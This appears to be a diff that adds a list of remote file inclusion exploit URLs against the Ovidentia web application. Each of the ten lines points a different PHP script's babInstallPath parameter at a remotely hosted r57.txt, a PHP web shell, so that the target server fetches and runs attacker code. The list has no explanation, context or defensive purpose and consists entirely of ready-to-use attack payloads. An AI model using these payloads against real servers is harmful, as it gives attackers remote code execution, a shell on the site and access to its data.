@@ -1,0 +1,10 @@
+http://www.example.com/orid/index.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/topman.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/approb.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/vacadmb.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/vacadma.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/vacadm.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/statart.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/search.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/posts.php?babInstallPath=http://www.example.com/r57.txt?
+http://www.example.com/orid/ovidentia/options.php?babInstallPath=http://www.example.com/r57.txt?
